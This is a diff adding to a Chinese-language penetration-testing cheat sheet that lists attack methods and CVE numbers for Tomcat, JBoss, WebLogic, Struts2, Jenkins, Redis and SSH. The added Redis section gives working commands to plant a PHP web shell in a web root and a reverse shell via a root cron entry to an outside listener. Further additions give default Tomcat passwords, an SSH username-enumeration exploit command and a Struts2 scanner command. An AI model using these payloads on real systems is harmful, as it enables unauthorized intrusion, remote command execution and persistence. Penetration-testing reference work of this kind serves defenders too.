@@ -47,16 +47,23 @@ Web 中间件
 - Tomcat
 	+ 端口号：8080
 	+ 攻击方法
-		+ 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。
-		+ 在管理后台部署 war 后门文件
-		+ 远程代码执行漏洞
+		- 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。
+		- 在管理后台部署 war 后门文件
+		- 远程代码执行漏洞
+	+ 常见漏洞
+		- CVE-2016-8735
+		- CVE-2017-12615
 - Jboss
 	+ 端口：8080
 	+ 攻击方法
-		+ 弱口令，爆破
-		+ 管理后台部署 war 后门
-		+ 反序列化
-		+ 远程代码执行
+		- 弱口令，爆破
+		- 管理后台部署 war 后门
+		- 反序列化
+		- 远程代码执行
+	+ 常见漏洞
+		- CVE-2015-7501
+		- CVE-2017-7504
+		- CVE-2017-12149
 - WebLogic
 	+ 端口：7001，7002
 	+ 攻击方法
@@ -65,6 +72,20 @@ Web 中间件
 		+ SSRF
 		+ 反序列化漏洞
 		+ weblogic_uac
+	+ 常见漏洞
+		- CVE-2019-2725
+		- CVE-2019-2729
+		- CVE-2018-3191
+		- CVE-2018-2628
+		- CVE-2018-2893
+		- CVE-2018-2894
+		- CVE-2017-3506
+		- CVE-2017-10271
+		- CVE-2017-3248
+		- CVE-2016-0638
+		- CVE-2016-3510
+		- CVE-2015-4852
+		- CVE-2014-4210
 - WebSphere
 	+ 端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090
 	+ 攻击方法
@@ -77,6 +98,10 @@ Web 框架
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - Struts2
 	+ 可利用漏洞
+		+ S2-048
+		+ S2-052
+		+ S2-053
+		+ S2-057
 		+ S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
 		+ S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10
 		+ S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1
@@ -85,8 +110,11 @@ Web 框架
 		+ S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1
 		+ S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15
 		+ S2-013 CVE-2013-1966 Struts 2.0.0-2.3.1
-		+  S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1
+		+ S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1
 		+ S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1
+	+ 扫描工具
+		+ https://github.com/x51/STS2G/releases
+		+ ``ST2SG --mode scan --url http://xxx.com/index.action``
 - Spring 框架
 	+ 可利用漏洞
 		+ CVE-2010-1622
@@ -139,6 +167,8 @@ Jenkins
 	+ 反序列化漏洞
 	+ 未授权访问漏洞
 	+ 登录入口爆破
+- 常见漏洞
+	+ CVE-2018-1999002
 
 Puppet
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -301,8 +331,29 @@ Redis数据库
 - 默认端口：6379
 - 攻击方法
 	+ 爆破：弱口令
-	+ 未授权访问+配合ssh key提权；
-	
+	+ 未授权访问+配合ssh key提权
+- 工具和命令
+	+ 连接：``redis-cli -h 172.16.143.1 -p 6379``
+	+ 查看所有的keys：``keys *``
+	+ 写入文件
+		::
+		
+			CONFIG GET dir
+			CONFIG SET dir /usr/share/apache/htdocs/
+			SET shell "<?php echo system($_REQUEST[cmd])?>"
+			CONFIG SET dbfilename shell.php
+			save
+	+ 反弹shell
+		::
+		
+			C2服务器监听：nc -lvnp 7999
+			
+			redis服务器执行以下redis命令：
+			set xx "\n* * * * * bash -i >& /dev/tcp/192.168.32.144/7999 0>&1\n"
+			config set dir /var/spool/cron/
+			config set dbfilename root
+			save
+
 SysBase数据库
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - 默认端口：服务端口5000；监听端口4100；备份端口：4200
@@ -347,7 +398,7 @@ Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服�
 	+ 远程代码执行
 	+ 弱口令
 	+ 未授权访问（public）
-	
+
 SSH服务
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 SSH是协议，通常使用OpenSSH软件实现协议应用。
@@ -357,6 +408,15 @@ SSH是协议，通常使用OpenSSH软件实现协议应用。
 	+ 爆破
 	+ 后门
 	+ 漏洞：28退格漏洞、OpenSSL漏洞
+- 常见漏洞
+	+ CVE-2018-15473
+		- OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机。
+		- auxiliary(scanner/ssh/ssh_enumusers
+		- https://github.com/Rhynorater/CVE-2018-15473-Exploit.git
+		- ``python sshUsernameEnumExploit.py --port 22 --userList /home/kali/Downloads/rockyou.txt 192.168.100.103``
+- 命令
+	+ 公钥登录: ``ssh -i id_rsa root@142.93.198.56``
+
 
 Telnet服务
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
